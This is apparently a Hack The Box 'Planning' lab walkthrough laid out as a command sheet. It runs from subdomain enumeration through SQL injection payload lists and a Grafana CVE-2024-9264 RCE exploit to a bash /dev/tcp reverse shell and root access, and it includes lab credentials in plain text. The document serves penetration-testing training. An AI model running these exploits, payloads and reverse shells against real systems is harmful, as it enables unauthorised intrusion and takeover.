# HTB Planning Walkthrough

```bash
# === Host File Setup ===
cat /etc/hosts
# Ensure the following entry exists:
# 10.129.34.41    planning.htb

# === Directory Enumeration with Gobuster ===
gobuster dir -u http://planning.htb -w medium.txt
gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
# Discovered:
# /index.php
# /contact.php
# /about.php
# /detail.php
# /course.php
# /enroll.php

# === Subdomain Enumeration with wfuzz ===
cd SecLists-master/Discovery/DNS
cp bitquark-subdomains-top100000.txt subdomains.txt
wfuzz -c -w subdomains.txt -u 'http://planning.htb/' -H "Host: FUZZ.planning.htb" --hw 12
echo "10.129.34.41 grafana.planning.htb" | sudo tee -a /etc/hosts

# === SQL Injection Testing with sqlmap ===
# Capture a POST request to /search into request.txt using Burp Suite
sqlmap -r request.txt --batch --level=5 --risk=3 --random-agent
# Result: No injection point found.

# === Manual SQLi Payload Testing ===
# Boolean-based:
# ' OR '1'='1
# ' OR 1=1 --
# " OR 1=1 --
# admin' --
# Error-based:
# ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y) --
# ' AND 1=CONVERT(int, (SELECT @@version)) --
# Time-based:
# ' OR IF(1=1, SLEEP(5), 0) --
# ' OR 1=1 AND SLEEP(3) --
# UNION:
# ' UNION SELECT NULL, NULL --
# ' UNION SELECT 1, @@version --
# Edge cases:
# ') OR ('1'='1
# admin') -- 
# ') AND 1=2 -- 
# ' OR 1 GROUP BY CONCAT(username, password) -- 
# " OR 1=1 LIMIT 1 OFFSET 1 --
# Header:
# Host: ' OR 1=1 --

# === Exploiting Grafana via CVE-2024-9264 ===
wget https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/archive/refs/heads/main.zip -O rce.zip
unzip rce.zip
cd CVE-2024-9264-RCE-Exploit-main
python3 poc.py --url http://grafana.planning.htb \
               --username admin \
               --password 0D5oT70Fq13EvB5r \
               --reverse-ip 10.10.14.19 \
               --reverse-port 4444
nc -lvnp 4444

# === Post Exploitation (Container) ===
whoami
env
cat run.sh
# GF_SECURITY_ADMIN_USER=enzo
# GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
ssh enzo@10.129.34.41

# === Host Access & Priv Esc ===
whoami
cat ~/user.txt
wget http://10.10.14.19:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# === Network and Service Enumeration ===
ss -tulnp
lsof -i :3000
lsof -i :8000
ps aux | grep 23357

# === Found password in cron.db via linpeas ===

# === Port Forwarding (8000 to 5555) ===
# Python script (manual port forward):
import socket
import threading

def forward(source, destination):
    while True:
        data = source.recv(4096)
        if not data:
            break
        destination.sendall(data)

listen = socket.socket()
listen.bind(("0.0.0.0", 5555))
listen.listen(5)

while True:
    client_sock, _ = listen.accept()
    server_sock = socket.socket()
    server_sock.connect(("127.0.0.1", 9898))

    threading.Thread(target=forward, args=(client_sock, server_sock)).start()
    threading.Thread(target=forward, args=(server_sock, client_sock)).start()

# === Visit forwarded service ===
# http://planning.htb:5555
# Login: root / P4ssw0rdS0pRi0T3c

# === Launch Reverse Shell from Cron Web UI ===
# Command used:
# /bin/bash -i >& /dev/tcp/10.10.14.99/4444 0>&1

# Set listener:
nc -lvnp 4444

# Got root shell
whoami
# root
